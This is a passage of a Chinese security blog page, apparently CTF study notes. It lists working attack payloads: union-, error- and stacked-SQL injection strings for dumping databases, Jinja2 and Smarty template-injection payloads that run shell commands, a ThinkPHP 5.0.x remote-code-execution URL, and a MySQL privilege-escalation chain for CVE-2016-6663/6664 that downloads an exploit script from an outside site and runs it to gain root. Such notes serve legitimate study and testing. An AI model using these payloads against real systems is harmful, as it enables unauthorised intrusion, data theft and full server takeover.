<li><p>字符型：当输入的参数被当做字符串时，称为字符型（有引号闭合）</p>
<hr>
</li>
</ul>
<h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><ul>
<li><p>适用于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化</p>
</li>
<li><p>步骤</p>
<p><em>1. 页面观察</em></p>
<p><em>2. 注入点判断</em></p>
<p><em>3. 判断当前表的字段个数</em>：</p>
<pre><code class="sql">?id=1&#39; order by 3 --+
</code></pre>
<p><em>4. 判断显示位</em>：判断我们的输入会在屏幕哪个地方进行回显</p>
<pre><code class="sql">?id=-1&#39; union select 1,2,3 --+
//=-1&#39;:(让前面的参数查不出来)
//1,2,3:(总列数)
//--+(注释)
</code></pre>
<p><em>5. 爆数据库名字</em></p>
<pre><code class="sql">?id=-1&#39; union select 1,database(),3 --+
//1:(头列数)
//3:(尾列数)
</code></pre>
<p><em>6. 爆数据库中的表</em></p>
<pre><code class="sql">?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()/&#39;数据库名&#39; --+
</code></pre>
<p><em>7. 爆表中的字段</em></p>
<pre><code class="sql">?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where (table_schema=&#39;数据库名&#39; and)  table_name=&#39;表名&#39; --+
</code></pre>
<p><em>8. 爆相应字段的所有数据</em></p>
<pre><code class="sql">?id=-1&#39; union select 1,group_concat(字段名,&#39;--&#39;,字段名,&#39;--&#39;,字段名),3 from 表名 --+
</code></pre>
</li>
</ul>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><ul>
<li><p><strong>group by 重复键冲</strong></p>
<p><code>?id=-1&#39; and (select 1 from (select count(*),concat((select 查询的内容 from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+ </code></p>
</li>
<li><p><strong>extractvalue(目标xml文档，xml路径)函数</strong></p>
<p>对XML文档进行查询的函数，从目标XML中返回包含所查询值的字符串</p>
<p><code>?id=-1&#39; and extractvalue(1,concat(&#39;^&#39;,(select (不要加列数) database()),&#39;^&#39;)) --+</code></p>
</li>
<li><p><strong>updatexml() 函数</strong></p>
<p>原理：updatexml()函数实际上是去更新了XML文档，但是我们在xml文档路径的位置里面写入了子查询，我们输入特殊字符，然后就			因为不符合输入规则然后报错了，但是报错的时候它其实已经执行了那个子查询代码</p>
<p>作用: 改变文档中符合条件的节点的值</p>
<p><code>?id=-1&#39; and updatexml(1,concat(&#39;^&#39;,(需要查询的内容),&#39;^&#39;),1) --+</code></p>
</li>
</ul>
<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><ul>
<li><p>使用<code>;</code>执行多条sql语句</p>
</li>
<li><p><strong>区别</strong>：联合查询注入只能执行查询语句，堆叠注入可执行任意语句</p>
</li>
<li><p><strong>rename…to…语句</strong>:可以重命名改表名，使表名可被直接查询到</p>
</li>
<li><p><strong>alter</strong>：修改已知表的列。（ 添加：add | 修改：alter，change | 撤销：drop ）</p>
<ul>
<li><p>添加：</p>
<p><code>alter table &quot; table_name&quot; add &quot; column_name&quot;  type;</code></p>
</li>
<li><p>删除：</p>
<p><code>alter table &quot; table_name&quot; drop &quot; column_name&quot;  type;</code></p>
</li>
<li><p>改变数据类型：</p>
<p><code>alter table &quot; table_name&quot; alter column &quot; column_name&quot; type;</code></p>
</li>
<li><p>改列名：</p>
<p><code>alter table &quot;table_name&quot; rename &quot;column1&quot; to &quot;column2&quot;;</code></p>
</li>
</ul>
</li>
<li><p><strong>编码</strong>(以select * from `1919810931114514`为例)</p>
<pre><code class="sql">;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#
</code></pre>
<ul>
<li>prepare…from…是预处理语句，会进行编码转换</li>
<li>execute用来执行由SQLPrepare创建的SQL语句</li>
<li>SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值</li>
</ul>
</li>
</ul>
<hr>
<h2 id="SSTI（服务器端模板注入）"><a href="#SSTI（服务器端模板注入）" class="headerlink" title="SSTI（服务器端模板注入）"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/Manuffer/article/details/120739989?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167059854216800213073654%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167059854216800213073654&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120739989-null-null.142%5Ev68%5Epc_new_rank,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&utm_term=SSTI&spm=1018.2226.3001.4187">SSTI（服务器端模板注入）</a></h2><ul>
<li><p>原理：</p>
<p>render_template渲染函数的问题</p>
<p>渲染函数在渲染的时候，往往对用户输入的变量不做渲染。</p>
<p>也就是说例如：<code>&#123;&#123;&#125;&#125;</code>在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把<code>&#123;&#123;&#125;&#125;</code>包裹的内容当做变量解析替换。比如<code>&#123;&#123;1+1&#125;&#125;</code>会被解析成2。如此一来就可以实现如同sql注入一样的注入漏洞。</p>
</li>
</ul>
<h3 id="判断SSTI类型"><a href="#判断SSTI类型" class="headerlink" title="判断SSTI类型"></a>判断SSTI类型</h3><p><img src="C:\Users\Asus\AppData\Roaming\Typora\typora-user-images\image-20221209231042495.png" alt="image-20221209231042495"></p>
<h3 id="类-1"><a href="#类-1" class="headerlink" title="类"></a>类</h3><p><code>&#123;&#123;config.__class__.__init__.__globals__['os'].popen('命令').read()&#125;&#125;</code></p>
<h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p><code>X-Forwarded-For:&#123;if system(&#39;cat /f*&#39;)&#125;&#123;/if&#125;</code></p>
<h1 id="模板漏洞"><a href="#模板漏洞" class="headerlink" title="模板漏洞"></a>模板漏洞</h1><h2 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/yangbz123/article/details/115329314?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167748807816782425179087%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167748807816782425179087&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-115329314-null-null.142%5Ev73%5Einsert_down1,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=thinkphp%E6%BC%8F%E6%B4%9E&spm=1018.2226.3001.4187">ThinkPHP</a></h2><h3 id="5-0-x"><a href="#5-0-x" class="headerlink" title="5.0.x"></a>5.0.x</h3><pre><code class="http">http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
</code></pre>
<h2 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/xj28555/article/details/120176124">MySQL提权</a></h2><h3 id="CVE-2016-6663、CVE-2016-6664组合提权"><a href="#CVE-2016-6663、CVE-2016-6664组合提权" class="headerlink" title="CVE-2016-6663、CVE-2016-6664组合提权"></a>CVE-2016-6663、CVE-2016-6664组合提权</h3><blockquote>
<p>mysql&lt;5.5.51||&lt;5.6.32||&lt;5.7.14</p>
</blockquote>
<pre><code class="mysql">cd /var/www/html/
gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient
./mysql-privesc-race test 123456 localhost testdb
    利用CVE-2016-6663将www-data权限提升为mysql权限
    
wget http://legalhackers.com/exploits/CVE-2016-6664/mysql-chowned.sh
chmod 777 mysql-chowned.sh
./mysql-chowned.sh /var/log/mysql/error.log
    利用CVE-2016-6664将Mysql权限提升为root权限
</code></pre>

    </div>
    
    
    
    
    
    
    
</div>

                <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2023 遗世独立の幻想乡
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;CloudFlowing
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

            </div>
            </transition>
            
            <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
            </transition>
            
        </div>
        <script src="/blog/js/main.js"></script>
        
        




         
    <script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>

